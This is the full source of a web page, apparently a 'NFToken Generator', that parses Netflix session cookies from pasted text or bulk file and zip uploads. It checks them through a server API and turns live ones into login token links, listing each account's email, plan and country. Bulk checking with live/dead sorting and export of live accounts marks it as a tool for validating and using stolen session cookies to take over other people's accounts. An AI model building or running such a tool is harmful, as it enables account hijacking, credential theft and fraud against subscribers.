<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>NFToken Generator</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
<style>
:root {
  --bg:       #0A0A0C;
  --surface:  #111116;
  --surface2: #17171E;
  --border:   #1E1E28;
  --border2:  #2A2A36;
  --accent:   #E50914;
  --accent-d: #B8060F;
  --text:     #F0F0F4;
  --text-2:   #9494A6;
  --text-3:   #55556A;
  --mono:     'JetBrains Mono', monospace;
  --sans:     'Inter', sans-serif;
  --r:        6px;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--sans);font-size:14px;line-height:1.5;-webkit-font-smoothing:antialiased}
.shell{min-height:100vh;display:flex;flex-direction:column;max-width:860px;margin:0 auto;padding:0 20px}
header{padding:32px 0 24px;border-bottom:1px solid var(--border);display:flex;align-items:baseline;gap:14px}
.logo-mark{width:10px;height:10px;border-radius:50%;background:var(--accent);flex-shrink:0;align-self:center}
header h1{font-size:17px;font-weight:600;letter-spacing:-.01em}
header p{font-size:13px;color:var(--text-3);margin-left:auto}
.tabs{display:flex;margin-top:24px;border-bottom:1px solid var(--border)}
.tab-btn{background:none;border:none;border-bottom:2px solid transparent;padding:10px 20px 10px 0;font:500 13px var(--sans);color:var(--text-3);cursor:pointer;margin-bottom:-1px;transition:color .15s,border-color .15s}
.tab-btn.active{color:var(--text);border-bottom-color:var(--accent)}
.tab-btn:hover:not(.active){color:var(--text-2)}
.panel{display:none;padding:28px 0 48px}
.panel.active{display:block}
label{display:block;font-size:12px;font-weight:500;color:var(--text-2);margin-bottom:7px;letter-spacing:.01em}
textarea,input[type=text]{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:var(--r);color:var(--text);font:13px/1.6 var(--mono);padding:12px 14px;resize:vertical;outline:none;transition:border-color .15s}
textarea:focus,input[type=text]:focus{border-color:var(--border2)}
textarea{min-height:120px}
.hint{font-size:12px;color:var(--text-3);margin-top:6px}
.drop-zone{border:1px dashed var(--border2);border-radius:var(--r);padding:28px 20px;text-align:center;cursor:pointer;transition:border-color .15s,background .15s;position:relative}
.drop-zone:hover,.drop-zone.drag-over{border-color:var(--accent);background:rgba(229,9,20,.04)}
.drop-zone input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}
.drop-icon{display:block;width:32px;height:32px;margin:0 auto 10px;opacity:.35}
.drop-zone p{font-size:13px;color:var(--text-2)}
.drop-zone small{font-size:11px;color:var(--text-3);display:block;margin-top:4px}
.file-list{margin-top:10px;font:12px var(--mono);color:var(--text-2);text-align:left;max-height:80px;overflow-y:auto}
.file-list div{padding:2px 0}
.row{display:flex;gap:10px;align-items:flex-end;margin-top:18px}
.btn{display:inline-flex;align-items:center;gap:7px;background:var(--accent);color:#fff;border:none;border-radius:var(--r);padding:10px 20px;font:500 13px var(--sans);cursor:pointer;transition:background .15s,opacity .15s;white-space:nowrap;flex-shrink:0}
.btn:hover{background:var(--accent-d)}
.btn:disabled{opacity:.45;cursor:not-allowed}
.btn-ghost{background:var(--surface2);border:1px solid var(--border);color:var(--text-2)}
.btn-ghost:hover{background:var(--border)}
.progress-wrap{margin-top:18px;display:none}
.progress-wrap.show{display:block}
.progress-bar-bg{height:3px;background:var(--border);border-radius:2px;overflow:hidden}
.progress-bar-fill{height:100%;background:var(--accent);border-radius:2px;width:0%;transition:width .3s}
.progress-label{font-size:12px;color:var(--text-3);margin-top:6px}
.result-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);overflow:hidden;margin-top:20px}
.rc-head{display:flex;align-items:center;gap:8px;padding:12px 16px;border-bottom:1px solid var(--border)}
.status-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.status-dot.live{background:#22C55E}
.status-dot.dead{background:#EF4444}
.status-dot.error{background:#F59E0B}
.rc-head span{font-size:13px;font-weight:500}
.rc-head .rc-copy{margin-left:auto}
.rc-body{padding:14px 16px;display:grid;grid-template-columns:140px 1fr;row-gap:8px;column-gap:16px}
.rc-key{font-size:12px;color:var(--text-3);align-self:start;padding-top:1px}
.rc-val{font:12px var(--mono);color:var(--text);word-break:break-all}
.rc-val a{color:#60A5FA;text-decoration:none}
.rc-val a:hover{text-decoration:underline}
.bulk-summary{display:flex;gap:20px;margin-bottom:16px;flex-wrap:wrap}
.stat-item{font-size:12px;color:var(--text-3)}
.stat-item strong{font-size:15px;font-weight:600;color:var(--text);display:block;font-family:var(--mono)}
.stat-item strong.c-live{color:#22C55E}
.stat-item strong.c-dead{color:#EF4444}
.stat-item strong.c-error{color:#F59E0B}
.table-wrap{overflow-x:auto;border:1px solid var(--border);border-radius:var(--r)}
table{width:100%;border-collapse:collapse;font-size:12px}
thead th{background:var(--surface2);padding:9px 12px;text-align:left;font-weight:500;color:var(--text-3);border-bottom:1px solid var(--border);white-space:nowrap}
tbody tr{border-bottom:1px solid var(--border);transition:background .1s}
tbody tr:last-child{border-bottom:none}
tbody tr:hover{background:var(--surface2)}
tbody td{padding:9px 12px;color:var(--text);vertical-align:middle}
tbody td.mono{font-family:var(--mono)}
.tag{display:inline-block;padding:2px 7px;border-radius:3px;font-size:11px;font-weight:500;font-family:var(--mono)}
.tag.live{background:rgba(34,197,94,.12);color:#22C55E}
.tag.dead{background:rgba(239,68,68,.12);color:#EF4444}
.tag.error{background:rgba(245,158,11,.12);color:#F59E0B}
.token-link{color:#60A5FA;text-decoration:none;font-family:var(--mono);font-size:11px;max-width:220px;display:inline-block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;vertical-align:bottom}
.token-link:hover{text-decoration:underline}
.bulk-actions{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
.msg{padding:12px 14px;border-radius:var(--r);font-size:13px;margin-top:16px;display:none}
.msg.show{display:block}
.msg.error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:#FCA5A5}
.msg.info{background:rgba(96,165,250,.08);border:1px solid rgba(96,165,250,.15);color:var(--text-2)}
.toast{position:fixed;bottom:24px;right:24px;background:var(--surface2);border:1px solid var(--border2);color:var(--text);padding:10px 16px;border-radius:var(--r);font-size:13px;opacity:0;transform:translateY(6px);transition:opacity .2s,transform .2s;pointer-events:none;z-index:999}
.toast.show{opacity:1;transform:translateY(0)}
@media(max-width:540px){.rc-body{grid-template-columns:100px 1fr}header p{display:none}}
</style>
</head>
<body>
<div class="shell">
  <header>
    <div class="logo-mark"></div>
    <h1>NFToken Generator</h1>
    <p>Netflix cookie → login token</p>
  </header>

  <div class="tabs">
    <button class="tab-btn active" data-tab="single">Single</button>
    <button class="tab-btn" data-tab="bulk">Bulk</button>
  </div>

  <!-- Single -->
  <div class="panel active" id="panel-single">
    <label for="single-input">Cookie</label>
    <textarea id="single-input" placeholder="Paste any format — Netscape tab-delimited, JSON array, or key=value&#10;&#10;NetflixId=abc123; SecureNetflixId=xyz..."></textarea>
    <p class="hint">Or upload a cookie file below</p>
    <div style="margin-top:12px">
      <div class="drop-zone" id="single-drop">
        <input type="file" id="single-file" accept=".txt,.json,.csv">
        <svg class="drop-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 16V4m0 0L8 8m4-4 4 4M4 20h16" stroke-linecap="round" stroke-linejoin="round"/></svg>
        <p>Drop a file or click to browse</p>
        <small>.txt · .json · .csv</small>
        <div class="file-list" id="single-file-list"></div>
      </div>
    </div>
    <div class="row">
      <button class="btn" id="single-run">
        <svg width="14" height="14" viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3" fill="currentColor"/></svg>
        Generate Token
      </button>
      <button class="btn btn-ghost" id="single-clear">Clear</button>
    </div>
    <div class="msg" id="single-msg"></div>
    <div id="single-result"></div>
  </div>

  <!-- Bulk -->
  <div class="panel" id="panel-bulk">
    <label>Cookie files</label>
    <div class="drop-zone" id="bulk-drop">
      <input type="file" id="bulk-file" accept=".txt,.json,.csv,.zip" multiple>
      <svg class="drop-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 16V4m0 0L8 8m4-4 4 4M4 20h16" stroke-linecap="round" stroke-linejoin="round"/></svg>
      <p>Drop files or click to browse</p>
      <small>.txt · .json · .csv · .zip — multiple files accepted</small>
      <div class="file-list" id="bulk-file-list"></div>
    </div>
    <div style="margin-top:14px">
      <label for="bulk-text">Or paste multiple cookies</label>
      <textarea id="bulk-text" style="min-height:90px" placeholder="One cookie per line or separated by blank lines&#10;&#10;NetflixId=aaa...&#10;NetflixId=bbb..."></textarea>
    </div>
    <div class="row" style="margin-top:14px">
      <button class="btn" id="bulk-run">
        <svg width="14" height="14" viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3" fill="currentColor"/></svg>
        Run Bulk Check
      </button>
      <button class="btn btn-ghost" id="bulk-clear">Clear</button>
    </div>
    <div class="progress-wrap" id="bulk-progress">
      <div class="progress-bar-bg"><div class="progress-bar-fill" id="bulk-bar"></div></div>
      <div class="progress-label" id="bulk-label">0 / 0</div>
    </div>
    <div class="msg" id="bulk-msg"></div>
    <div id="bulk-result-wrap" style="margin-top:20px;display:none">
      <div class="bulk-summary" id="bulk-summary"></div>
      <div class="table-wrap">
        <table>
          <thead>
            <tr><th>#</th><th>Status</th><th>Email</th><th>Plan</th><th>Country</th><th>Valid For</th><th>Token Link</th></tr>
          </thead>
          <tbody id="bulk-tbody"></tbody>
        </table>
      </div>
      <div class="bulk-actions">
        <button class="btn btn-ghost" id="bulk-export-live">Export live</button>
        <button class="btn btn-ghost" id="bulk-export-all">Export all</button>
        <button class="btn btn-ghost" id="bulk-copy-tokens">Copy token links</button>
      </div>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
const COOKIE_KEYS     = ["NetflixId","SecureNetflixId","nfvdid","OptanonConsent"];
const REQ_COOKIE      = "NetflixId";
const NETSCAPE_MIN    = 7;
const ALLOWED_EXT     = new Set([".txt",".json",".csv",".zip"]);
const EXCLUDED        = /(__macosx|\.ds_store|thumbs\.db|desktop\.ini|\.udid|\.git|readme|license)/i;
const MAX_CONCURRENT  = 10;

// ── File filtering ─────────────────────────────────────────────────────────
function isCandidatePath(p) {
  if (p.endsWith("/")) return false;
  const name = p.split("/").pop();
  if (name.startsWith(".")) return false;
  if (EXCLUDED.test(p)) return false;
  const ext = name.includes(".") ? "."+name.split(".").pop().toLowerCase() : "";
  return ALLOWED_EXT.has(ext);
}
function isNetscape(t) {
  for (const raw of t.split("\n")) {
    const line = raw.trim();
    if (!line || line.startsWith("#")) continue;
    const p = line.split("\t");
    if (p.length >= NETSCAPE_MIN && COOKIE_KEYS.includes(p[5])) return true;
  }
  return false;
}
function isJson(t) {
  try {
    const d = JSON.parse(t);
    if (Array.isArray(d)) return d.some(c => c && COOKIE_KEYS.includes(c.name));
    if (typeof d === "object") {
      if (COOKIE_KEYS.some(k => k in d)) return true;
      return (d.cookies||[]).some(c => c && COOKIE_KEYS.includes(c.name));
    }
  } catch {}
  return false;
}
function isInline(t) { return /(?<!\w)NetflixId\s*=/.test(t); }
function isValidContent(t) { return isNetscape(t) || isJson(t) || isInline(t); }

// ── Cookie parsing ─────────────────────────────────────────────────────────
function decodeVal(v) {
  if (typeof v === "string" && v.includes("%")) { try { return decodeURIComponent(v); } catch {} }
  return v;
}
function extractCookieDict(text) {
  const out = {};
  for (const raw of text.split("\n")) {
    const line = raw.trim();
    if (!line || line.startsWith("#")) continue;
    const p = line.split("\t");
    if (p.length >= NETSCAPE_MIN) out[p[5]] = p[6];
  }
  try {
    const d = JSON.parse(text);
    if (Array.isArray(d)) {
      for (const c of d) if (c && COOKIE_KEYS.includes(c.name) && typeof c.value==="string") out[c.name]=decodeVal(c.value);
    } else if (typeof d === "object") {
      if (COOKIE_KEYS.some(k => k in d)) { for (const k of COOKIE_KEYS) if (typeof d[k]==="string") out[k]=decodeVal(d[k]); }
      else if (Array.isArray(d.cookies)) for (const c of d.cookies) if (c && COOKIE_KEYS.includes(c.name) && typeof c.value==="string") out[c.name]=decodeVal(c.value);
    }
  } catch {}
  for (const key of COOKIE_KEYS) {
    if (out[key]) continue;
    const m = text.match(new RegExp(`(?<!\\w)${key}=([^;,\\s]+)`));
    if (m) out[key] = decodeVal(m[1]);
  }
  return out;
}
function splitBlocks(text) {
  text = text.trim(); if (!text) return [];
  try {
    const d = JSON.parse(text);
    if (Array.isArray(d)) {
      const b = [];
      for (const item of d) {
        if (Array.isArray(item)) b.push(JSON.stringify(item));
        else if (item && typeof item === "object") {
          if (COOKIE_KEYS.some(k => k in item)) b.push(JSON.stringify(item));
          else if ("name" in item && "value" in item) b.push(JSON.stringify([item]));
        }
      }
      return b;
    }
  } catch {}
  const secs = text.split(/\n{2,}/);
  if (secs.length > 1) return secs.map(s=>s.trim()).filter(Boolean);
  return text.split("\n").map(l=>l.trim()).filter(Boolean);
}
function extractAllCookies(text) {
  const seen=new Set(), res=[];
  for (const block of splitBlocks(text)) {
    const cd=extractCookieDict(block), nid=cd[REQ_COOKIE];
    if (nid && !seen.has(nid)) { seen.add(nid); res.push(cd); }
  }
  return res;
}
async function readFileText(f) {
  return new Promise((res,rej) => { const r=new FileReader(); r.onload=e=>res(e.target.result); r.onerror=rej; r.readAsText(f); });
}
async function extractFromFiles(files) {
  const all=[], seen=new Set(); let scanned=0, skipped=0;
  for (const file of files) {
    const name=file.name.toLowerCase();
    const ext=name.includes(".")?"."+name.split(".").pop():"";
    if (!ALLOWED_EXT.has(ext)) { skipped++; continue; }
    const text = await readFileText(file);
    if (!isValidContent(text)) { skipped++; continue; }
    scanned++;
    for (const cd of extractAllCookies(text)) {
      const nid=cd[REQ_COOKIE]; if (nid && !seen.has(nid)) { seen.add(nid); all.push(cd); }
    }
  }
  return { cookies: all, scanned, skipped };
}

// ── API calls (server-proxied) ─────────────────────────────────────────────
async function apiCheck(nid) {
  const r = await fetch("/api/check", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ netflix_id: nid }),
  });
  return r.json();
}

async function apiParseCookie(text) {
  const r = await fetch("/api/parse_cookie", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ text }),
  });
  if (!r.ok) return null;
  const d = await r.json();
  return d.netflix_id || null;
}

// Concurrency pool
async function runPool(tasks, concurrency, onDone) {
  const results = new Array(tasks.length); let idx=0;
  async function worker() {
    while (idx < tasks.length) { const i=idx++; results[i]=await tasks[i](); onDone(results[i],i); }
  }
  await Promise.all(Array.from({length:Math.min(concurrency,tasks.length)},worker));
  return results;
}

// ── UI helpers ─────────────────────────────────────────────────────────────
let toastTimer;
function showToast(msg) {
  const t=document.getElementById("toast"); t.textContent=msg; t.classList.add("show");
  clearTimeout(toastTimer); toastTimer=setTimeout(()=>t.classList.remove("show"),1800);
}
function copyText(text) { navigator.clipboard.writeText(text).then(()=>showToast("Copied")); }
function showMsg(id,text,type="error") { const e=document.getElementById(id); e.textContent=text; e.className=`msg ${type} show`; }
function hideMsg(id) { document.getElementById(id).className="msg"; }

// ── Tabs ───────────────────────────────────────────────────────────────────
document.querySelectorAll(".tab-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".tab-btn").forEach(b=>b.classList.remove("active"));
    document.querySelectorAll(".panel").forEach(p=>p.classList.remove("active"));
    btn.classList.add("active");
    document.getElementById("panel-"+btn.dataset.tab).classList.add("active");
  });
});

// ── Drop zones ─────────────────────────────────────────────────────────────
function setupDrop(dropId, inputId, listId) {
  const drop=document.getElementById(dropId), input=document.getElementById(inputId), list=document.getElementById(listId);
  function updateList(files) {
    list.innerHTML="";
    for (const f of files) { const d=document.createElement("div"); d.textContent=f.name+" ("+(f.size>1024?(f.size/1024).toFixed(1)+"KB":f.size+"B")+")"; list.appendChild(d); }
    drop.classList.toggle("has-files",files.length>0);
  }
  input.addEventListener("change",()=>updateList(Array.from(input.files)));
  drop.addEventListener("dragover",e=>{e.preventDefault();drop.classList.add("drag-over")});
  drop.addEventListener("dragleave",()=>drop.classList.remove("drag-over"));
  drop.addEventListener("drop",e=>{
    e.preventDefault(); drop.classList.remove("drag-over");
    const dt=new DataTransfer(); for (const f of e.dataTransfer.files) dt.items.add(f);
    input.files=dt.files; updateList(Array.from(input.files));
  });
}
setupDrop("single-drop","single-file","single-file-list");
setupDrop("bulk-drop","bulk-file","bulk-file-list");

// ── Single ─────────────────────────────────────────────────────────────────
document.getElementById("single-clear").addEventListener("click",()=>{
  document.getElementById("single-input").value="";
  document.getElementById("single-result").innerHTML="";
  document.getElementById("single-file-list").innerHTML="";
  document.getElementById("single-drop").classList.remove("has-files");
  hideMsg("single-msg");
});

document.getElementById("single-run").addEventListener("click",async()=>{
  hideMsg("single-msg");
  document.getElementById("single-result").innerHTML="";
  const btn=document.getElementById("single-run");
  const files=Array.from(document.getElementById("single-file").files);
  const text=document.getElementById("single-input").value.trim();
  let nid=null;

  if (files.length) {
    const {cookies}=await extractFromFiles(files);
    if (!cookies.length) { showMsg("single-msg","No valid Netflix cookies found in file."); return; }
    nid=cookies[0][REQ_COOKIE];
  } else if (text) {
    nid=await apiParseCookie(text);
    if (!nid) { showMsg("single-msg","No NetflixId found. Check cookie format."); return; }
  } else {
    showMsg("single-msg","Paste a cookie or upload a file."); return;
  }

  btn.disabled=true; btn.textContent="Checking...";
  try {
    const r=await apiCheck(nid);
    renderSingle(r);
  } catch(e) { showMsg("single-msg","Request failed: "+e.message); }
  btn.disabled=false;
  btn.innerHTML=`<svg width="14" height="14" viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3" fill="currentColor"/></svg> Generate Token`;
});

function renderSingle(r) {
  const wrap=document.getElementById("single-result");
  if (r.status==="dead") { wrap.innerHTML=`<div class="msg error show">Cookie is invalid or expired (HTTP 401/403).</div>`; return; }
  if (r.status==="error") { wrap.innerHTML=`<div class="msg error show">Request failed: ${r.error}</div>`; return; }
  const url=r.token_url;
  wrap.innerHTML=`
<div class="result-card">
  <div class="rc-head">
    <div class="status-dot live"></div>
    <span>Active</span>
    <button class="btn btn-ghost rc-copy" onclick="copyText('${url}')">Copy link</button>
  </div>
  <div class="rc-body">
    <span class="rc-key">Email</span><span class="rc-val">${r.email}</span>
    <span class="rc-key">Plan</span><span class="rc-val">${r.membership}</span>
    <span class="rc-key">Country</span><span class="rc-val">${r.country}</span>
    <span class="rc-key">Member Since</span><span class="rc-val">${r.member_since}</span>
    <span class="rc-key">Profiles</span><span class="rc-val">${r.num_profiles}</span>
    <span class="rc-key">Can Stream</span><span class="rc-val">${r.can_stream}</span>
    <span class="rc-key">Max Streams</span><span class="rc-val">${r.max_streams}</span>
    <span class="rc-key">Sub Price</span><span class="rc-val">${r.subscription_price}</span>
    <span class="rc-key">Token Link</span><span class="rc-val"><a href="${url}" target="_blank" rel="noopener">${url}</a></span>
    <span class="rc-key">Expires</span><span class="rc-val">${r.expires_fmt}</span>
    <span class="rc-key">Valid For</span><span class="rc-val">${r.valid_for}</span>
  </div>
</div>`;
}

// ── Bulk ───────────────────────────────────────────────────────────────────
let bulkResults=[];

document.getElementById("bulk-clear").addEventListener("click",()=>{
  document.getElementById("bulk-text").value="";
  document.getElementById("bulk-file-list").innerHTML="";
  document.getElementById("bulk-drop").classList.remove("has-files");
  document.getElementById("bulk-result-wrap").style.display="none";
  document.getElementById("bulk-progress").classList.remove("show");
  hideMsg("bulk-msg"); bulkResults=[];
});

document.getElementById("bulk-run").addEventListener("click",async()=>{
  hideMsg("bulk-msg");
  document.getElementById("bulk-result-wrap").style.display="none";
  bulkResults=[];

  const files=Array.from(document.getElementById("bulk-file").files);
  const text=document.getElementById("bulk-text").value.trim();
  let allCookies=[], scanned=0, skipped=0;

  if (files.length) { const r=await extractFromFiles(files); allCookies=r.cookies; scanned=r.scanned; skipped=r.skipped; }
  if (text && isValidContent(text)) {
    for (const cd of extractAllCookies(text)) if (!allCookies.some(c=>c[REQ_COOKIE]===cd[REQ_COOKIE])) allCookies.push(cd);
  }
  if (!allCookies.length) { showMsg("bulk-msg","No valid Netflix cookies found."); return; }

  const prog=document.getElementById("bulk-progress"), bar=document.getElementById("bulk-bar"), label=document.getElementById("bulk-label");
  const btn=document.getElementById("bulk-run");
  prog.classList.add("show"); btn.disabled=true; btn.textContent="Running...";

  let liveCount=0;
  const tasks=allCookies.map(cd=>async()=>{ const r=await apiCheck(cd[REQ_COOKIE]); return r; });
  bulkResults=await runPool(tasks,MAX_CONCURRENT,(r,i)=>{
    if (r.status==="live") liveCount++;
    const done=i+1, total=allCookies.length, pct=Math.round(done/total*100);
    bar.style.width=pct+"%"; label.textContent=`${done} / ${total}  —  ${liveCount} live`;
  });

  btn.disabled=false;
  btn.innerHTML=`<svg width="14" height="14" viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3" fill="currentColor"/></svg> Run Bulk Check`;
  bulkResults.sort((a,b)=>({live:0,dead:1,error:2}[a.status]||2)-({live:0,dead:1,error:2}[b.status]||2));
  renderBulk(bulkResults,scanned,skipped);
});

function renderBulk(results,scanned,skipped) {
  const live=results.filter(r=>r.status==="live"), dead=results.filter(r=>r.status==="dead"), error=results.filter(r=>r.status==="error");
  document.getElementById("bulk-summary").innerHTML=`
    <div class="stat-item"><strong>${results.length}</strong>Total</div>
    <div class="stat-item"><strong class="c-live">${live.length}</strong>Live</div>
    <div class="stat-item"><strong class="c-dead">${dead.length}</strong>Dead</div>
    <div class="stat-item"><strong class="c-error">${error.length}</strong>Error</div>
    ${scanned?`<div class="stat-item"><strong>${scanned}</strong>Files read${skipped?` (${skipped} skipped)`:""}</div>`:""}`;

  const tbody=document.getElementById("bulk-tbody"); tbody.innerHTML="";
  results.forEach((r,i)=>{
    const tr=document.createElement("tr");
    const url=r.token_url||"";
    tr.innerHTML=`
      <td class="mono">${i+1}</td>
      <td><span class="tag ${r.status}">${r.status}</span></td>
      <td>${r.email||"—"}</td>
      <td>${r.membership||"—"}</td>
      <td>${r.country||"—"}</td>
      <td class="mono">${r.valid_for||r.error||"—"}</td>
      <td>${url?`<a class="token-link" href="${url}" target="_blank" rel="noopener" title="${url}">${url}</a>`:"—"}</td>`;
    tbody.appendChild(tr);
  });
  document.getElementById("bulk-result-wrap").style.display="block";
}

// ── Export ─────────────────────────────────────────────────────────────────
function buildExport(rows) {
  const sep="=".repeat(64), ts=new Date().toISOString().replace("T"," ").slice(0,19)+" UTC";
  const L=[`NFToken Export — ${ts}`,""]; 
  for (const r of rows) {
    L.push(sep,`Status         : ${r.status}`);
    if (r.email && r.email!=="N/A") {
      L.push(`Email          : ${r.email}`,`Plan           : ${r.membership}`,`Country        : ${r.country}`,
              `Member Since   : ${r.member_since}`,`Profiles       : ${r.num_profiles}`,
              `Can Stream     : ${r.can_stream}`,`Max Streams    : ${r.max_streams}`,`Sub Price      : ${r.subscription_price}`);
    }
    if (r.token_url) L.push(`Token Expires  : ${r.expires_fmt}`,`Valid For      : ${r.valid_for}`,`Login URL      : ${r.token_url}`);
    if (r.error) L.push(`Error          : ${r.error}`);
    L.push(`NetflixId      : ${r.netflix_id}`,"");
  }
  return L.join("\n");
}
function dlText(text,name) { const a=document.createElement("a"); a.href=URL.createObjectURL(new Blob([text],{type:"text/plain"})); a.download=name; a.click(); }
function ts() { return new Date().toISOString().slice(0,16).replace(/[-:T]/g,""); }
document.getElementById("bulk-export-live").addEventListener("click",()=>{ const l=bulkResults.filter(r=>r.status==="live"); if (!l.length){showToast("No live results");return;} dlText(buildExport(l),`nftoken_live_${ts()}.txt`); });
document.getElementById("bulk-export-all").addEventListener("click",()=>{ if (!bulkResults.length){showToast("Nothing to export");return;} dlText(buildExport(bulkResults),`nftoken_all_${ts()}.txt`); });
document.getElementById("bulk-copy-tokens").addEventListener("click",()=>{ const l=bulkResults.filter(r=>r.token_url).map(r=>r.token_url); if (!l.length){showToast("No tokens");return;} copyText(l.join("\n")); showToast(`Copied ${l.length} link(s)`); });
</script>
</body>
